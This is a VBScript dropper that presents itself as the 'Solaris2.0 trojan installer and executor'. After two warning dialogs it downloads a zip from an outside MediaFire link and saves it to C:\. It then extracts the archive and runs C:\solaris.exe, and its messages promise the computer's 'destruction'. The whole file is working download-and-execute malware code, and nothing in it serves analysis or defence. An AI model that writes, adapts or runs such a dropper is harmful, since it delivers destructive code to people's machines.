Option Explicit

' Function to display a custom dialog with buttons
Function ShowCustomDialog(title, description, button1Text, button2Text)
    Dim dialogResult
    dialogResult = MsgBox(description, vbQuestion + vbYesNo, title)
    If dialogResult = vbYes Then
        ShowCustomDialog = button1Text
    Else
        ShowCustomDialog = button2Text
    End If
End Function

' Function to check if a header exists in the response
Function HeaderExists(http, headerName)
    Dim allHeaders, headersArr, i
    allHeaders = http.GetAllResponseHeaders
    headersArr = Split(allHeaders, vbCrLf)
    For i = 0 To UBound(headersArr)
        If InStr(1, headersArr(i), headerName & ":", vbTextCompare) > 0 Then
            HeaderExists = True
            Exit Function
        End If
    Next
    HeaderExists = False
End Function

Dim url, destination, unzipDestination, exeFile, welcomeResult, confirmationResult

' Update URL, destination, unzipDestination, and exeFile with your specific values
url = "https://download1515.mediafire.com/ocmwqfbb6thgt2uYNNUZ-VKbwki0WRs-v3d4ZBgAxeQAa5QQUzG9BXe9j9gDy6djBJJB8oUOs9ZIz12Jegu0uWwmBKmdYrq2OD0PpYxwbC9kT2N2M4frM4M3a-EbgwXJc1v6dSBqHGKM4fYT_DRFaQ5rzp2eMrvGzKTcwMPfvRJvl0Q/phcl8ys4ok3o2n2/U+DUN+GOOFED.zip"
destination = "C:\U DUN GOOFED.zip"
unzipDestination = "C:\"
exeFile = "C:\solaris.exe"

' Display the welcome window
welcomeResult = ShowCustomDialog("Solaris2.0 installer and executor", "Welcome to the Solaris2.0 trojan installer and executor. This installer attempts to install and execute the Solaris2.0 trojan, which will damage your computor. If you do not know what you just executed click cancel to terminate this installer. If you know what you are doing and are in a safe environment click continue.", "Next", "Cancel")

If welcomeResult = "Next" Then
    ' Display the confirmation window
    confirmationResult = ShowCustomDialog("Confirmation", "Are you sure you want to continue? This installer will install and execute Solaris2.0 trojan, which will destroy your computor! Do you STILL want to proceed? This will be your last warning before this installer installs and executes Solaris2.0 trojan!", "Next", "Cancel")

    If confirmationResult = "Next" Then
        ' Start the download
        MsgBox "Click OK to start downloading the Solaris Trojan. By clicking OK this installer will start to install the trojan in the backround and will continue the installation after the download has completed."

        ' Create an HTTP object
        Dim http: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
        Dim stream, totalSize, fileSize, percentage

        ' Send an HTTP GET request to the URL
        http.Open "GET", url, False
        http.Send

        ' Check if the request was successful (status code 200)
        If http.Status = 200 Then
            ' Check if the 'Content-Type' header exists
            If HeaderExists(http, "Content-Type") Then
                ' Retrieve the 'Content-Type' header value
                Dim contentType
                contentType = http.GetResponseHeader("Content-Type")
                MsgBox "Content-Type: " & contentType
            Else
                MsgBox "Content-Type header not found."
            End If
            
            ' Get the total file size
            totalSize = http.GetResponseHeader("Content-Length")

            ' Save the response body to a file
            Set stream = CreateObject("ADODB.Stream")
            stream.Open
            stream.Type = 1
            stream.Write http.ResponseBody
            stream.SaveToFile destination
            stream.Close

            MsgBox "Download complete. Extracting the file... Prepare for the destruction of your PC."

            ' Extract the zip file
            Dim objShell : Set objShell = CreateObject("Shell.Application")
            Dim objZipFile : Set objZipFile = objShell.NameSpace(destination)
            Dim objDestinationFolder : Set objDestinationFolder = objShell.NameSpace(unzipDestination)
            objDestinationFolder.CopyHere objZipFile.Items

            MsgBox "Extraction complete. Executing the file... Click OK to continue"

            ' Open the .exe file
            Dim objShellExecute : Set objShellExecute = CreateObject("WScript.Shell")
            objShellExecute.Run """" & exeFile & """"

            MsgBox "Solaris2.0 Trojan downloaded, extracted, and executed successfully. Your computor will soon be destroyed! Hve fun LOL :]"
        Else
            MsgBox "Error downloading file: " & http.Status & " " & http.StatusText
        End If
    Else
        MsgBox "Operation cancelled."
    End If
Else
    MsgBox "Operation cancelled."
End If